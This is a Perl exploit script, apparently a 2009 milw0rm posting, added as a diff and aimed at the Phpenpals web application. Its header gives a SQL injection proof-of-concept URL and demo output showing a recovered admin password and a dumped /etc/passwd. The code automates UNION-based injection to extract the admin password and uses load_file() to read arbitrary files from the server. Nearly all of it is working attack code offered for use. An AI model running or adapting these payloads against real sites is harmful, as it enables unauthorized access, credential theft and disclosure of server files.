@@ -1,0 +1,223 @@
+#!usr/bin/perl
+#|------------------------------------------------------------------------------------------------------------------
+#| -Info:
+#
+#| -Name: Phpenpals
+#| -Version: <= 1.1
+#| -Site: http://sourceforge.net/projects/phpenpals/
+#| -Download Script: http://sourceforge.net/project/showfiles.php?group_id=40166&package_id=32303&release_id=250717
+#| -Bug: Sql Injection
+#| -Found: by Br0ly
+#| -BRAZIL >D
+#| -Contact: br0ly.Code@gmail.com
+#|
+#| -Gretz: Osirys , xs86 , 6_Bl4ck9_f0x6 , str0ke
+#|
+#| -p0c:
+#| -SQL INJECTION:
+#|
+#| -http://localhost/Scripts/phpenpals/mail.php?ID=-1+union+select+1,@@version--
+#| -Vuls: @array = ('profile.php?personalID=' , 'mail.php?ID=')
+#|   
+#| - You just need pass of the admin for login in:
+#| - http://localhost/Scripts/phpenpals/admin.php
+#|
+#| -Exploit: Demo:
+#|------------------------------------------------------------------------------------------------------------------
+#|
+#| perl phpenpals.txt http://localhost/Scripts/phpenpals/ 1
+#|
+#|  --------------------------------------
+#|   -Phpenpals                     
+#|   -Sql Injection                      
+#|   -by Br0ly                           
+#|  --------------------------------------
+#|
+#|[+] Getting the pass of the admin.
+#|[+] Password = admin
+#|
+#|perl phpenpals.txt http://localhost/Scripts/phpenpals/ 2
+#|
+#|  --------------------------------------
+#|   -Phpenpals                     
+#|   -Sql Injection                      
+#|   -by Br0ly                           
+#|  --------------------------------------
+#|
+#|[*] Cat:/etc/passwd
+#|     
+#|
+#|root:x:0:0:root:/root:/bin/bash
+#|daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+#|bin:x:2:2:bin:/bin:/bin/sh
+#|sys:x:3:3:sys:/dev:/bin/sh
+#|sync:x:4:65534:sync:/bin:/bin/sync
+#|games:x:5:60:games:/usr/games:/bin/sh
+#|man:x:6:12:man:/var/cache/man:/bin/sh
+#|lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+#|
+#| ;D
+#| And sorry for my bad english ;/
+#|
+ 
+  use IO::Socket::INET;
+  use LWP::UserAgent;
+
+  my $host      = $ARGV[0];
+  my $opcao     = $ARGV[1];
+  my $sql_path  = "/mail.php?ID=";
+ 
+  if (@ARGV < 2) {
+      &banner();
+      &help("-1");
+  }
+ 
+  elsif(cheek($host,$opcao) == 1) {
+      &banner();
+      &xploit($host,$opcao,$sql_path);
+  }
+     
+  else {
+      &banner();
+      help("-2");
+  }
+ 
+  sub xploit() {
+      my $host     = $_[0];
+      my $opcao    = $_[1];
+      my $sql_path = $_[2];
+      if($opcao == 1) { &adm_pass($host,$sql_path);  }
+      if($opcao == 2) { &file_load($host,$sql_path); } 
+  }
+
+  sub adm_pass() {
+     
+      print "[+] Getting the pass of the admin.\n";
+      my $host     = $_[0];
+      my $spl_path = $_[1];
+      my $sql_atk = $host.$spl_path."-1+union+select+1,concat(0x6272306c79,0x3a,password,0x3a,0x6272306c79)+from+admin--";
+      my $re = get_url($sql_atk);
+      if($re =~ /br0ly:(.+):br0ly/) {
+    print "[+] Password = $1\n";
+    exit(0);
+      }
+      else {
+    print "[-] Exploit, Fail\n";
+    exit(0);
+     
+      }
+  }
+ 
+  sub file_load() {
+ 
+     my $host     = $_[0];
+     my $spl_path = $_[1];
+    
+     print "[*] Cat:";
+     my $file = <STDIN>;
+     chomp($file);
+     $file !~ /exit/ || die "[-] Quitting ..\n";
+    
+     if ($file !~ /\/(.*)/) {
+    print "\n[-] Bad filename !\n";
+    &file_load($host,$spl_path);
+     }
+    
+     my $fencode = hex_str($file);
+     my $byte = "0x";
+     my $fl_atk = $host.$spl_path."-1+union+select+1,load_file(".$byte.$fencode.")--";
+     my $re = get_url($fl_atk);
+     my $content = tag($re);
+         
+     if ($content =~ /<table>\*\*<tr><td>(.+)<\/td><td><\/td><\/tr>/) {
+    my $out = $1;
+   
+        $out =~ s/\$/ /g;
+    $out =~ s/\*\*\*\*/ /g;
+    $out =~ s/\*/\n/g;
+    $out =~ s/Send/ /g;
+    $out =~ s/email/ /g;
+    $out =~ s/to/ /g;
+        $out =~ s/$out/$out\n/ if ($out !~ /\n$/);
+        print "$out";
+    &file_load($host,$spl_path);
+
+    if($out =~ ' ') {
+      $c++;
+      print "[-] Can't find ".$file." \n";
+      if ( $c < 3 ) {
+        print "[-] Exploit Fail\n\n";
+        &file_load($host,$spl_path);
+      }
+   
+      else { exit(0); }
+   
+    }
+      }
+  
+  }   
+
+  sub get_url() {
+    $link = $_[0];
+    my $req = HTTP::Request->new(GET => $link);
+    my $ua = LWP::UserAgent->new();
+    $ua->timeout(4);
+    my $response = $ua->request($req);
+    return $response->content;
+  }
+
+  sub tag() {
+    my $string = $_[0];
+    $string =~ s/ /\$/g;
+    $string =~ s/\s/\*/g;
+    return($string);
+  }
+
+  sub hex_str () {
+   
+    my $str_1 = $_[0];
+    my $str_hex = unpack('H*', "$str_1");
+    return $str_hex;
+   
+  }
+
+  sub cheek() {
+    my $host  = $_[0];
+    my $opcao = $_[1];
+    if (($host =~ /http:\/\/(.*)/) && (($opcao == 1 || $opcao == 2))) {
+        return 1;
+    }
+    else {
+        return 0;
+    }
+  }
+
+  sub help() {
+
+    my $error = $_[0];
+    if ($error == -1) {
+        print "\n[-] Error, missed some arguments !\n\n";
+    }
+   
+    elsif ($error == -2) {
+
+        print "\n[-] Error, Bad arguments !\n\n";
+    }
+ 
+    print "[*] Usage : perl $0 http://localhost/phpenpals/ opcao \n";
+    print "    Ex:     perl $0 http://localhost/phpenpals/ 1\n";
+    print "[*] opcao 1 : adm pass\n";
+    print "[*] opcao 2 : file_disc\n";
+    exit(0);
+  }
+
+  sub banner {
+    print "\n".
+          "  --------------------------------------\n".
+          "   -Phpenpals                       \n".
+          "   -Sql Injection                       \n".
+          "   -by Br0ly                            \n".
+          "  --------------------------------------\n\n";
+  }
+
+# milw0rm.com [2009-05-15]
